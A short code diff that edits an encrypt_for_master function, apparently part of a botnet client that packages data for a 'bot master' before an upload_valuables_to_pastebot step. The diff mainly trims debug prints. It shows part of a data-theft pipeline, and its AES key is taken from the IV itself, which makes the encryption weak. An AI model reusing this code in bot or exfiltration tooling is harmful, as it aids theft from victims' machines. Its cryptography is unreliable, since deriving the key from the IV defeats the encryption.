@@ -24,30 +24,19 @@ def encrypt_for_master(data):
     # Encrypt the file so it can only be read by the bot master
     hashed_data = SHA256.new(data).digest();
 
-    pkcs_cipher = PKCS1_v1_5.new(masters_public_key);
-
     # generate iv from RSA publickey
     # generate AES CBC from RSA and iv
     # encrypt AES key with RSA
     # RSA(iv) + AES(file) + digest
 
     iv = Random.get_random_bytes(AES.block_size)
-    print(len(str(iv)))
+    print(iv)
     aes_encrypted_data = AES.new(str(iv)[:16], AES.MODE_CBC, iv).encrypt(ANSI_X923_pad(data, AES.block_size))
-    print("AES")
-    print(aes_encrypted_data)
-    print(len(aes_encrypted_data))
 
     rsa_encrypted_iv = masters_public_key.encrypt(iv, "")[0]
+    print(len(rsa_encrypted_iv))
 
-    print("RSA")
-    print(rsa_encrypted_iv)
-    print(type(rsa_encrypted_iv))
-
-    #array = [rsa_encrypted_iv, aes_encrypted_data, hashed_data]
-    array = (aes_encrypted_data + hashed_data)
-
-    return rsa_encrypted_iv + array;
+    return rsa_encrypted_iv + aes_encrypted_data + hashed_data;
     # return rsa_encrypted_iv + aes_encrypted_data + hashed_data;
 
 def upload_valuables_to_pastebot(fn):
